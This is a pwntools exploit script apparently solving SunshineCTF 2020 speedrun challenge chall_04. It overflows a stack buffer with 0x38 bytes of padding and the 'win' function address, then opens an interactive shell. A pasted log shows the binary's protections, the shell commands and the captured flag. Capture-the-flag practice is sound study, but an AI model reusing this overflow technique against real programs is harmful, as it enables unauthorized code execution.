from pwn import *

p = remote('chal.2020.sunshinectf.org', 30004)
#p = process('./chall_04')

e = ELF('./chall_04')

p.readline()

p.send('a'*0x12)

input('...')

line = b'\xcc'*0x38
line += p64(e.symbols['win'])
line += b'\n'

p.send(line)

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30004: Done
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_04'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
...
[*] Switching to interactive mode
$ ls
chall_04
flag.txt
$ cat flag.tx
cat: flag.tx: No such file or directory
$ cat flag.txt
sun{critical-acclaim-96cfde3d068e77bf}
'''
